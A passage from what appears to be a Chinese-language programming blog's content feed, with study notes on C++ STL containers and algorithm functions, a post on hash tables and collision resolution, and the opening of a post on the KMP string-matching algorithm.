class="keyword">size_t</span> pos = <span class="number">0</span>, <span class="keyword">size_t</span> len = npos)</span> <span class="keyword">const</span></span>;<span class="comment">//在字符位置pos开始，跨越len个字符（或直到字符串的结尾，以先到者为准）对象的部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串大小写转化</span></span><br><span class="line">transform(s.begin(),s.end(),s.begin(),::<span class="built_in">tolower</span>);</span><br><span class="line">transform(s.begin(),s.end(),s.begin(),::<span class="built_in">toupper</span>);</span><br></pre></td></tr></table></figure><h1 id="5-list-列表"><a href="#5-list-列表" class="headerlink" title="5 list(列表)"></a>5 list(列表)</h1><p>list是由双向链表实现的，因此内存空间是不连续的。只能通过指针访问数据，所以list的随机存取非常没有效率，时间复杂度为$O(n)$；但由于链表的特点，能高效地进行插入和删除。</p><p>使用：</p><ul><li>需要高效的随机存取，而不在乎插入和删除的效率，使用vector;</li><li>如果需要大量的插入和删除，而不关心随机存取，则应使用list</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; l;<span class="comment">//声明一个空列表</span></span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">l</span><span class="params">(n)</span></span>;<span class="comment">//声明一个有n个元素的列表，每个元素都是由其默认构造函数T()构造出来的</span></span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">l</span><span class="params">(n,val)</span></span>;<span class="comment">//声明一个由n个元素的列表，每个元素都是由其复制构造函数T(val)得来的</span></span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">l</span><span class="params">()</span></span>;<span class="comment">//声明一个空列表</span></span><br><span class="line"><span class="function"><span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; <span class="title">l</span><span class="params">(first,last)</span></span>;<span class="comment">//声明一个列表，其元素的初始值由区间所指定的序列中的元素;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">l.begin() <span class="comment">// 得到一个指向容器起始位置的iterator</span></span><br><span class="line">l.end() <span class="comment">//返回list末端下一位置，如a[n]中的第n+1个位置a[n]，实际是不存在，经常作为循环结束判断条件使用</span></span><br><span class="line">l.push_back(x) <span class="comment">//list的末端插入x</span></span><br><span class="line">l.push_front(x) <span class="comment">// 从list的头部插入x</span></span><br><span class="line">l.empty() <span class="comment">// 利用empty() 判断list是否为空，空返回true</span></span><br><span class="line">l.resize(n) <span class="comment">//将l的长度改为n，超出的元素将被删除，如果需要扩展那么调用默认构造函数T()将元素加到list末端</span></span><br><span class="line">l.resize(n, val)<span class="comment">//扩展元素要调用构造函数T(val)函数进行元素构造，其余部分与resize相同</span></span><br><span class="line">l.clear() <span class="comment">//清空list中的所有元素</span></span><br><span class="line">l.front() <span class="comment">//获得list容器中的头部元素</span></span><br><span class="line">l.back() <span class="comment">//可以获得list容器的最后一个元素</span></span><br><span class="line">l.pop_back <span class="comment">// 删除最后一个元素</span></span><br><span class="line">l.pop_front() <span class="comment">// 删除第一个元素；序列必须不为空，当list为空时调用pop_back和pop_front会使程序崩掉</span></span><br><span class="line">l.assign() <span class="comment">//具体和vector中的操作类似</span></span><br><span class="line">l.swap(ll) <span class="comment">//交换两个链表，swap(l ,ll)也可</span></span><br><span class="line">merge() <span class="comment">//合并两个链表并使之默认升序(也可改)，l1.merge(l2，greater&lt;int&gt;()); 调用结束后l2变为空，l1中元素包含原来l1 和 l2中的元素，并且排好序，升序。其实默认是升序，greater&lt;int&gt;()可以省略，另外greater&lt;int&gt;()是可以变的，也可以不按升序排列。</span></span><br></pre></td></tr></table></figure><h1 id="6-stack-栈"><a href="#6-stack-栈" class="headerlink" title="6 stack(栈)"></a>6 stack(栈)</h1><p>stack模版类的定义在\<stack\>头文件中，stack模版类需要两个模版参数，一个是元素类型，另一个是容器类型，但是只有元素类型是必要的，在不指定容器类型时，默认容器的类型为deque。</stack\></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">s.push(x); <span class="comment">// ⼊栈</span></span><br><span class="line">s.pop(); <span class="comment">// 出栈，不返回值</span></span><br><span class="line">x = s.top(); <span class="comment">// 访问栈顶，</span></span><br><span class="line">s.empty(); <span class="comment">// 当栈空时，返回true</span></span><br><span class="line">s.size(); <span class="comment">// 访问栈中元素个数</span></span><br></pre></td></tr></table></figure><h1 id="7-queue-队列"><a href="#7-queue-队列" class="headerlink" title="7 queue(队列)"></a>7 queue(队列)</h1><p>queue模版类的定义在头文件\<queue\>中。queue与stack相似， queue模版类也需要两个模版参数，一个元素类型，一个容器类型，元素类型是必须的，容器类型是可选的。  </queue\></p><p>标准库提供queue分为：</p><ol><li>queue(队列)：queue从队首弹出，先入先出，并且queue只能从队首删除元素，但是两端都能访问。</li><li>deque(双向队列)：可以访问两端并且可以在队首和队尾删除和插入元素</li><li>priority_queue(优先队列)：优先队列与队列的差别在于优先队列不是按照入队的顺序出队，而是按照队列中元素的优先权出队列（默认为大者优先，也可以通过指定算子来指定自己的优先顺序）；priority_queue模版类有三个模版参数，第一个是元素类型，第二个是容器类型，第三个是比较算子。其中后两者都可以忽略，默认容器为vector，默认算子为less，即小的往前排，大的往后排（出队列时列尾元素先出队）。  </li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 队列定义</span></span><br><span class="line"><span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 队列基本操作</span></span><br><span class="line">q.push(x); <span class="comment">// 从队尾⼊队列</span></span><br><span class="line">q.pop(); <span class="comment">// 从队首出队列</span></span><br><span class="line">q.front(); <span class="comment">// 访问队首元素</span></span><br><span class="line">q.back(); <span class="comment">// 访问队尾元素</span></span><br><span class="line">q.empty(); <span class="comment">// 如果队列为空，则返回true，否则返回false</span></span><br><span class="line">q.size(); <span class="comment">// 访问队列中的元素个数</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 双向队列定义</span></span><br><span class="line"><span class="built_in">deque</span>&lt;<span class="keyword">int</span>&gt; dq; <span class="comment">//创建一个int双端队列dq</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 双向队列基本操作</span></span><br><span class="line">dq.empty(); <span class="comment">//判断队列是否为空，为空返回true</span></span><br><span class="line">dq.push_front(s); <span class="comment">//将s从队头入队</span></span><br><span class="line">dq.push_back(s); <span class="comment">//将s从队尾入队，和普通队列方式一样</span></span><br><span class="line">dq.front(); <span class="comment">//只返回队头元素</span></span><br><span class="line">dq.back(); <span class="comment">//只返回队尾元素</span></span><br><span class="line">dq.pop_front(); <span class="comment">//将队头元素弹出</span></span><br><span class="line">dq.pop_back(); <span class="comment">//将队尾元素弹出</span></span><br><span class="line">dq.clear(); <span class="comment">//将队列清空</span></span><br><span class="line"><span class="comment">//组合操作</span></span><br><span class="line"><span class="comment">//C++中的queue自身是不支持clear操作的，但是双端队列deque是支持clear操作的。</span></span><br><span class="line"><span class="built_in">queue</span>&lt;<span class="keyword">int</span>&gt; empty;</span><br><span class="line">swap(empty, q);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 优先队列定义</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">priority_queue&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; &gt; qq; <span class="comment">// 注意在两个尖括号之间⼀定要留空格，防止误判</span></span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt; qqq; <span class="comment">// 定义小的先出队列</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 优先队列基本操作</span></span><br><span class="line">q.empty() <span class="comment">// 如果队列为空，则返回true，否则返回false</span></span><br><span class="line">q.size() <span class="comment">// 返回队列中元素的个数</span></span><br><span class="line">q.pop() <span class="comment">// 删除队首元素，但不返回其值</span></span><br><span class="line">q.top() <span class="comment">// 返回具有最高优先级的元素值，但不删除该元素</span></span><br><span class="line">q.push(x) <span class="comment">// 在基于优先级的适当位置插⼊新元素x</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 算子实现</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> x, y, z;</span><br><span class="line">T(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c) : x(a), y(b), z(c) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> T &amp;tOne, <span class="keyword">const</span> T &amp;tTwo)&#123;</span><br><span class="line"><span class="keyword">return</span> tOne.z &lt; tTwo.z; <span class="comment">// 按照z的顺序来决定tOne和tTwo的顺序</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">priority_queue&lt;T&gt; q;</span><br><span class="line">q.push(T(<span class="number">4</span>, <span class="number">4</span>, <span class="number">3</span>));</span><br><span class="line">q.push(T(<span class="number">2</span>, <span class="number">2</span>, <span class="number">5</span>));</span><br><span class="line">q.push(T(<span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>));</span><br><span class="line">q.push(T(<span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>));</span><br><span class="line"><span class="keyword">while</span> (!q.empty())&#123;</span><br><span class="line">T t = q.top();</span><br><span class="line">q.pop();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; t.x &lt;&lt; <span class="string">" "</span> &lt;&lt; t.y &lt;&lt; <span class="string">" "</span> &lt;&lt; t.z &lt;&lt; <span class="string">'\n'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8-map-字典"><a href="#8-map-字典" class="headerlink" title="8 map(字典)"></a>8 map(字典)</h1><p>map是与字典相关的关联式容器，map模版类的定义在头文件$<map>$中，用有序二叉树表存储类型为pair<const key, t>的元素对序列。  序列中的元素以const Key部分作为标识， map中所有元素的Key值必须是唯一的，multimap则允许有重复的Key值。unordered_map是无序 map 容器。</const></map></p><p>将map可以通过一个Key值来快速决定一个元素，因此非常适合于需要按照Key值查找元素的容器。map模版类需要四个模版参数，第一个是键值类型，第二个是元素类型，第三个是比较算子，第四个是分配器类型。其中键值类型和元素类型是必要的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 字典定义</span></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字典基本操作</span></span><br><span class="line"><span class="comment">/* 向map中插⼊元素 */</span></span><br><span class="line">m[key] = value; <span class="comment">// [key]操作是map很有特色的操作,如果在map中存在键值为key的元素对, 则返回该元素对的值域部分,否则将会创建⼀个键值为key的元素对,值域为默认值。所以可以⽤该操作向map中插⼊元素对或修改已经存在的元素对的值域部分。</span></span><br><span class="line">m.insert(make_pair(key, value)); <span class="comment">// 也可以直接调用insert方法插⼊元素对,insert操作会返回⼀个pair,当map中没有与key相匹配的键值时,其first是指向插⼊元素对的迭代器,其second为true;若map中已经存在与key相等的键值时,其first是指向该元素对的迭代器,second为false，并且不会更新value</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查找元素 */</span></span><br><span class="line"><span class="keyword">int</span> i = m[key]; <span class="comment">// key不存在时,会创建键值为key(当另⼀个元素是整型时m[key]=0)的元素对</span></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator it = m.find(key); <span class="comment">// 如果map中存在与key相匹配的键值时,find操作将返</span></span><br><span class="line"><span class="comment">//回指向该元素对的迭代器,否则,返回的迭代器等于map的end()(参见vector中提到的begin()和end()操作)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 删除元素 */</span></span><br><span class="line">m.erase(key); <span class="comment">// 删除与指定key键值相匹配的元素对,并返回被删除的元素的个数</span></span><br><span class="line">m.erase(it); <span class="comment">// 删除由迭代器it所指定的元素对,并返回指向下⼀个元素对的迭代器</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 其他操作 */</span></span><br><span class="line">m.size(); <span class="comment">// 返回元素个数</span></span><br><span class="line">m.empty(); <span class="comment">// 判断是否为空，空返回true</span></span><br><span class="line">m.clear(); <span class="comment">// 清空所有元素</span></span><br><span class="line"><span class="function">size_type <span class="title">count</span> <span class="params">(<span class="keyword">const</span> key_type&amp; k)</span> <span class="keyword">const</span></span>;<span class="comment">//按key搜索</span></span><br></pre></td></tr></table></figure><h1 id="9-bitset"><a href="#9-bitset" class="headerlink" title="9 bitset()"></a>9 bitset()</h1><p>bitset模版类的定义在\<bitset\>头文件中，用来方便地管理一系列的bit位类。 bitset除了可以访问指定下标的bit位以外，还可以把它们作为一个整数来进行某些统计。bitset模板类需要一个模版参数，用来明确指定含有多少位。  </bitset\></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAXN = <span class="number">32</span>;</span><br><span class="line"><span class="built_in">bitset</span>&lt;MAXN&gt; bt; <span class="comment">// bt 包括 MAXN 位，下标 0 ~ MAXN - 1，默认初始化为 0</span></span><br><span class="line"><span class="function"><span class="built_in">bitset</span>&lt;MAXN&gt; <span class="title">bt1</span><span class="params">(<span class="number">0xf</span>)</span></span>; <span class="comment">// 0xf 表示十六进制数 f，对应二进制 1111，将 bt1 低 4 位初始化为 1</span></span><br><span class="line"><span class="function"><span class="built_in">bitset</span>&lt;MAXN&gt; <span class="title">bt2</span><span class="params">(<span class="number">012</span>)</span></span>; <span class="comment">// 012 表示八进制数 12，对应二进制 1010，即将 bt2 低 4 位初始化为 1010</span></span><br><span class="line"><span class="function"><span class="built_in">bitset</span>&lt;MAXN&gt; <span class="title">bt3</span><span class="params">(<span class="string">"1010"</span>)</span></span>; <span class="comment">// 将 bt3 低 4 位初始化为 1010</span></span><br><span class="line"><span class="function"><span class="built_in">bitset</span>&lt;MAXN&gt; <span class="title">bt4</span><span class="params">(s, pos, n)</span></span>; <span class="comment">// 将 01 字符串 s 的 pos 位开始的 n 位初始化 bt4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 基本操作</span></span><br><span class="line">bt.any() <span class="comment">// bt 中是否存在置为 1 的二进制位</span></span><br><span class="line">bt.none() <span class="comment">// bt 中不存在置为 1 的二进制位</span></span><br><span class="line">bt.count() <span class="comment">// bt 中置为 1 的二进制位的个数</span></span><br><span class="line">bt.size() <span class="comment">// bt 中二进制位的个数</span></span><br><span class="line">bt[pos] <span class="comment">// 访问 bt 中在 pos 处的二进制位</span></span><br><span class="line">bt.test(pos) <span class="comment">// bt 中在 pos 处的二进制位是否为 1</span></span><br><span class="line">bt.<span class="built_in">set</span>() <span class="comment">// 把 bt 中所有二进制位都置为 1</span></span><br><span class="line">bt.<span class="built_in">set</span>(pos) <span class="comment">// 把 bt 中在 pos 处的二进制位置为 1</span></span><br><span class="line">bt.reset() <span class="comment">// 把 bt 中所有二进制位都置为 0</span></span><br><span class="line">bt.reset(pos) <span class="comment">// 把 bt 中在pos处的二进制位置为0</span></span><br><span class="line">bt.flip() <span class="comment">// 把 bt 中所有二进制位逐位取反</span></span><br><span class="line">bt.flip(pos) <span class="comment">// 把 bt 中在 pos 处的二进制位取反</span></span><br><span class="line">bt[pos].flip() <span class="comment">// 同上</span></span><br><span class="line">bt.to_ulong() <span class="comment">// ⽤用 bt 中同样的二进制位返回⼀个 unsigned long 值</span></span><br><span class="line">bt.to_string()<span class="comment">//转字符串</span></span><br><span class="line">os &lt;&lt; bt <span class="comment">// 把 bt 中的位集输出到 os 流</span></span><br></pre></td></tr></table></figure><h1 id="10-iterator-迭代器"><a href="#10-iterator-迭代器" class="headerlink" title="10 iterator(迭代器)"></a>10 iterator(迭代器)</h1><p>iterator（迭代器）是用于访问容器中元素的指示器，从这个意义上说， iterator（迭代器）相当于数据结构中所说的“遍历指针”，也可以把iterator（迭代器）看作是一种泛化的指针。每种STL容器都有自己的iterator（迭代器）子类。</p><h1 id="11-algorithm"><a href="#11-algorithm" class="headerlink" title="11 algorithm"></a>11 algorithm</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">max_element(v.begin(),v.end()); <span class="comment">//返回容器最大值的迭代器</span></span><br><span class="line">min_element(v.begin(),v.end()); <span class="comment">//返回容器最小值的迭代器</span></span><br><span class="line">sort(v.begin(), v.end(), cmp); <span class="comment">//cmp可以自定义，默认升序排序</span></span><br><span class="line">reverse(v.begin(), v.end()); <span class="comment">//反转容器</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">memset</span> <span class="params">( <span class="keyword">void</span> * ptr, <span class="keyword">int</span> value, <span class="keyword">size_t</span> num )</span></span>;<span class="comment">//将ptr所指向的某一块内存中的前num个字节的内容全部设置为ch指定的ASCII值， 第一个值为指定的内存地址，块的大小由第三个参数指定，这个函数通常为新申请的内存做初始化工作， 其返回值为指向s的指针，它是对较大的结构体或数组进行清零操作的一种最快方法。</span></span><br><span class="line">fill(begin, last, val);<span class="comment">//将[begin, last)赋值为val</span></span><br><span class="line"><span class="built_in">memcpy</span>(target, source, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)*k);<span class="comment">//复制source数组的前k个到target</span></span><br><span class="line"><span class="built_in">memcpy</span>(target, source, <span class="keyword">sizeof</span>(source));<span class="comment">//复制source数组到target</span></span><br><span class="line">lower_bound(a, a+n, x);<span class="comment">//查找&gt;=x的第一个位置</span></span><br><span class="line">__gcd(<span class="keyword">int</span> x, <span class="keyword">int</span> y)<span class="comment">//求x与y的最大公约数</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>哈希表</title>
      <link href="/2021/07/22/%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
      <url>/2021/07/22/%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h1><p>散列表（Hash Table），又称哈希表。是一种数据结构，特点是：数据元素的关键字与其存储地址直接相关，通过“散列函数（哈希函数）”：$Addr=H(key)$。</p><p>若不同的关键字通过散列函数映射到同一个值，则称它们为“同义词”</p><p>通过散列函数确定的位置已经存放了其他元素，则称这种情况为“冲突”</p><h1 id="常见的散列函数"><a href="#常见的散列函数" class="headerlink" title="常见的散列函数"></a>常见的散列函数</h1><ol><li>除留余数法——$H(key)=key\%p$，散列表表长为$m$，取一个不大于$m$但最接近或等于$m$的质数$p$</li><li>直接定址法——$H(key)=key$ 或$H(key)=a*key +b$，其中，a和b是常数。这种方法计算最简单，且不会产生冲突。它适合关键字的分布基本连续的情况，若关键字分布不连续，空位较多，则会造成存储空间的浪费。</li><li>数字分析法——选取数码分布较为均匀的若干位作为散列地址，如手机号码。</li><li>平方取中法——取关键字的平方值的中间几位作为散列地址。具体取多少位要视实际情况而定。这种方法得到的散列地址与关键字的每位都有关系，因此使得散列地址分布比较均匀，适用于关键字的每位取值都不够均匀或均小于散列地址所需的位数。如身份证号。</li></ol><h1 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h1><ol><li>拉链法：把所有“同义词”存储在一个链表中，Java中的HashMap、HashSet</li><li>开放定址法：可存放新表项的空闲地址既向它的同义词表项开放，又向它的非同义词表项开放。其数学递推公式为：$H<em>{i}=\left(H(k e y)+d</em>{i}\right) \% m$，$i=0,1,2, \ldots, k \quad(k \leqslant m-1)$，其中$m$表示散列表表长；$d_i$为增量序列；$i$可理解为“第$i$次发生冲突”<ul><li>线性探测法：$d_{i}=0,1,2,3, \ldots, m-1$; 即发生冲突时，每次往后探测相邻的下一个单元是否为空<ul><li>线性探测法很容易造成同义词、非同义词的“聚集（堆积）”现象，严重影响查找效率</li><li>产生原因——冲突后再探测一定是放在某个连续的位置</li></ul></li><li>平方探测法：当 $\mathrm{d}_{\mathrm{i}}=\mathbf{0}^{2}, \mathbf{1}^{2},-\mathbf{1}^{2}, \mathbf{2}^{2},-\mathbf{2}^{2}, \ldots, \mathbf{k}^{2},-\mathbf{k}^{2}$ 时，称为平方探测法，又称二次探测法其中 $\mathbf{k} \leq \mathbf{m} / \mathbf{2}$<ul><li>比起线性探测法更不易产生“聚集（堆积）”问题</li><li>散列表长度m必须是一个可以表示成$4j+3$的素数，才能探测到所有位置</li></ul></li><li>伪随机序列法：$\mathbf{d}<em>{\mathrm{i}}$ 是一个伪随机序列，如 $\mathrm{d}</em>{\mathrm{i}}=\mathbf{0 , 5 , 2 4 , 1 1 , \ldots}$</li></ul></li><li>再散列法：除了原始的散列函数$H(key)$之外，多准备几个散列函数，当散列函数冲突时，用下一个散列函数计算一个新地址，直到不冲突为止：$\mathrm{H}<em>{\mathrm{i}}=\mathrm{RH}</em>{\mathrm{i}}(\mathrm{Key}) \quad \mathrm{i}=1,2,3 \ldots ., \mathrm{k}$</li></ol><h1 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h1><ul><li>无序集合：unordered_set</li><li>无序字典：unordered_map</li></ul><h1 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h1><ol><li><a href="https://www.luogu.com.cn/problem/P4305" target="_blank" rel="noopener">洛谷——P4305 [JLOI2011]不重复数字</a>：需要加快读</li><li><a href="https://leetcode-cn.com/problems/two-sum/" target="_blank" rel="noopener">leetcode-1 两数之和 (简单)</a></li><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMP算法</title>
      <link href="/2021/04/10/KMP%E7%AE%97%E6%B3%95/"/>
      <url>/2021/04/10/KMP%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-算法思想"><a href="#1-算法思想" class="headerlink" title="1 算法思想"></a>1 算法思想</h1><h2 id="1-1-思路"><a href="#1-1-思路" class="headerlink" title="1.1 思路"></a>1.1 思路</h2><p><strong>解决问题</strong>：当主串中第 i 个字符与模式中第 j 个字符失配（即比较不相等）时，主串中第 i 个字符（i 指针不回溯）应与模式中哪个字符再比较。</p><ol><li><p>$next[j]$：模式中第 j 个字符失配时，在模式中重新与主串比较的字符位置（最长公共前后缀长度+1，下标从 1 开始）</p><p>$\text { next }[j]=\left{\begin{array}{ll}<br>0 &amp; \text { 当 } j=1 \text { 时 } \<br>\operatorname{Max}\left{k \mid 1&lt;k&lt;j \text { 且 }^{\prime} p<em>{1} \cdots p</em>{k-1}^{\prime}={ }^{\prime} p<em>{j-k+1} \cdots p</em>{j-1}{ }^{\prime}\right} &amp;<br>\text { 当此集合不空时 } \<br>1 &amp; \text { 其他情况 }<br>\end{array}\right.$</p></li><li><p>计算next数组：仅取决于模式串本身而和相匹配的主串无关</p><ul><li>仿照kmp算法，如果$p[j] != p[next[j]]$，那么$next[j+1]$的可能次大值为$next[next[j]] + 1$，依次类推即可高效求出$next[j+1]$</li></ul></li><li><p>若在匹配过程中$s_i=p_j$，则 i 与 j 分别增 1；</p></li><li><p>否则，i 不变，j 退至 next[j] 的位置再比较；若 j 退到值为 0（即模式串的第一个字符失配），则从主串的下一个字符$s_{i+1}$起与模式串重新开始匹配；</p></li><li><p>重复执行step3、step4，直至结束。</p></li></ol><h2 id="1-2-优化"><a href="#1-2-优化" class="headerlink" title="1.2 优化"></a>1.2 优化</h2><p>修正next数组，$next[j]=k$，若模式中$p[j]=p[k]$，则$next[j] = next[k]$</p><h2 id="1-3-算法分析"><a href="#1-3-算法分析" class="headerlink" title="1.3 算法分析"></a>1.3 算法分析</h2><ul><li><strong>时间复杂度</strong>：$O(m+n)$</li><li><strong>空间复杂度</strong>：next数组，$O(m)$</li></ul><h1 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2 代码实现"></a>2 代码实现</h1><h2 id="2-1-C"><a href="#2-1-C" class="headerlink" title="2.1 C++"></a>2.1 C++</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 